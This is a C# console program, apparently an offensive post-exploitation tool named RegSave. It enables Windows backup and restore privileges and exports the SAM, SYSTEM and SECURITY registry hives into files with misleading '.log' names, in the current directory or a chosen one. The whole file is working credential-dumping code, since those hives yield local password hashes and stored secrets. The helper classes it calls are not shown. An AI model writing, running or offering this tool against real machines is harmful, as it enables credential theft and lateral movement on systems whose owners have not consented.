using System;
using System.IO;

namespace RegSave {
    public class Program {
        private static void DumpReg(string path) {
            try {
                Privileges.EnableDisablePrivilege("SeBackupPrivilege", true);
                Privileges.EnableDisablePrivilege("SeRestorePrivilege", true);
                Reg.ExportRegKey("SAM", Path.Combine(path, "sama.log"));
                Reg.ExportRegKey("SYSTEM", Path.Combine(path, "syse.log"));
                Reg.ExportRegKey("SECURITY", Path.Combine(path, "secu.log"));
            } catch (Exception e) {
                Console.WriteLine(e.Message);
                Console.WriteLine(e.StackTrace);
            }
        }

        public static void Main(string[] args) {
            if (args.Length == 0) {
                Console.WriteLine("[*] dumping into current directory\n");
                DumpReg(".");
            } else if (args.Length == 1) {
                Console.WriteLine("[*] dumping into {0}\n", args[0]);
                DumpReg(args[0]);
            } else {
                Console.WriteLine("[!] invalid arguments\n");
            }
        }
    }
}
